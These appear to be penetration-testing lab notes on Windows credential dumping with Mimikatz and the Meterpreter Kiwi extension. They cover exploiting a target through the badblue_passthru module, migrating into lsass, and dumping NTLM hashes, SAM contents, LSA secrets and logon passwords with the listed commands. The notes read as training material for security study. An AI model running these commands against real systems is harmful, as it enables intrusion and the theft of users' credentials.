* It is a Windows post-exploitation tool written by Benjamin Delpy(@gentilkiwi).
* **USE**
  * It allows for the extraction of clear-text passwords, hashes and Kerberos tickets from memory.
  * In other words, To extract hashes from the lsass.exe process memory where hashes are cached.
* **SAM DB** = A database file on Windows systems that stores hashes user passwords.
* **Ways to exploit with Mimikatz (Will require elevated priviliges)**
  1. Utilize the pre-compiled Mimikatz executable
  2. If I have acces to a meterpreter session on a Windows target, I can use the in-built meterpreter extension KIWI.
 

### PRACTICAL
* `use windows/http/badblue_passthru` ---> `set rhosts [ID]`
* If we run sysinfo, it returns --> Architecture: x64 --> meaning 64 -bit OS and Meterpreter: x86 --> 32-bit meterpreter
* The highest privileges on a Windows system are with: NT Authority/System. Check the username with: `getuid`
* To get those privileges migrate to lsass process.
  * `pgrep lsass` --> `migrate [ID revealed via the last command]`
 
1. Using the meterpreter extension KIWI
   * In the meterpreter session loaded by badblue_passthru: `load kiwi`
   * `?` --> To see the Kiwi commands that can be run.
   * Out of these commands --> `creds_all` --> This will reveal the NTLM hashes but not the passwords as Windows prohibits the storage of passwords in plain text.
   * Every SAM DB has a Syskey. `lsa_dump_sam` --> Will reveal Syskey and NTLM hashes of all the users on the system.
  
2. Using Mimikatz executable
   * Kali Linux has Mimikatz executables available
   * Found in the following directory: `/usr/share/windows-resources/mimikatz/x64/mimikatz.exe`
   * Inside the meterpreter session provided by `windows/http/badblue_passthru`: `upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe`
   * **TO execute this uploaded executable** --> `shell`  --> `.\mimikatz.exe`
   * Inside Mimikatz context,
     * check the privileges to debug --> `privilege::debug`
     * To dump the contents of SAM DB, or rather dump the actual cache of LSASS process: `lsadump::sam`
     * Administrator typically has RID:500 (which will be revealed by the above command.
     * To dump the secrets --> `lsadump::secrets`
     * **Display logon passwords** --> If the system has been configured in a way that passwords are stored in clear text in memory:
     * `sekurlsa::logonpasswords`
